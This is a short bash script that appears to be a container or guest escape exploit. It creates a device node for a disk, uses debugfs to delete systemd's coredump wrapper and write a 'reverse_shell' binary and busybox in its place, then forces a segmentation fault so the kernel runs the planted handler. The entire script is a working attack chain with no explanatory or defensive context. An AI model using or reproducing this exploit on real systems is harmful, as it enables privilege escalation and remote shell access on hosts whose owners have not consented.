#!/bin/bash
set -x 

. util.sh

lsblk
mknod /dev/guest_hd b $(get_block_address)
cat /proc/sys/kernel/core_pattern
debugfs -w /dev/guest_hd -R "rm /usr/lib/systemd/coredump-wrapper"
debugfs -w /dev/guest_hd -R "write reverse_shell /usr/lib/systemd/coredump-wrapper"
debugfs -w /dev/guest_hd -R "write busybox /usr/bin/busybox"
bash -c 'kill -11 $$' &
